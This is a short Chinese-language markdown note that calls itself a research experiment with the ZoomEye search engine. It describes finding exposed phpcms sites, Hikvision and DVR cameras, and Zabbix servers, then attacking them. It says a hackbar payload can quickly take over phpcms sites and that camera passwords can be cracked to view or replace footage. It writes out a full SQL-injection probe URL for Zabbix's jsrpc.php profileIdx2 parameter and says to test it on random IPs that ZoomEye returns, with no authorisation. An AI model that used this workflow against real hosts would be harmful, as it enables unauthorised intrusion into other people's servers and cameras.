# 基于zoomeye的调研实验
*** 
## 利用ZoomEye探索互联网hikvision摄像头
* 一个之前phpcmsv9 会员登录中心SQL注入漏洞 的例子，结合zoomeye快速黑掉网站，当然现在已经不可以用了，我实验的时候提示会话已过期，已经修补过了。
* ![]("1.PNG")
* 用zoomeye搜索phpcms,这样出来的就是包含这个字符串的页面的主机IP，随机打开一个，使用火狐的hackbar插件，加载payload，运行就可以达到目的。
* ![]("2.PNG")
* 类似找视频设备，可以DVRDVS-Webs
* ![]("3.PNG")
* ![]("4.PNG")
* 如果有比较丰富的经验，可以轻松破解密码，做到查看摄像甚至替换内容。

## 利用寻找可以利用0day漏洞进行入侵的系统
* 关于今年一个爆出的0 day漏洞：zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。
* 也可以利用zoomeye来进行测试：搜索：zabbix   /country:"China" 可以自己加地区
* ![]("5.PNG")
* 下面是查询漏洞是否存在的步骤：
	* 打开后再URL后面加上一段：
	jsrpc.phpsid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids5B232975D=23297&action=showlatest&filter=&filter_task=& mark_color=1
	* 随机访问一个IP测试，会出现如下字段：
	* ![]("6.PNG")
	* 经过多次寻找，发现源码中出现如下MySQL报错，则可以认定存在该漏洞：
	* ![]("7.PNG")
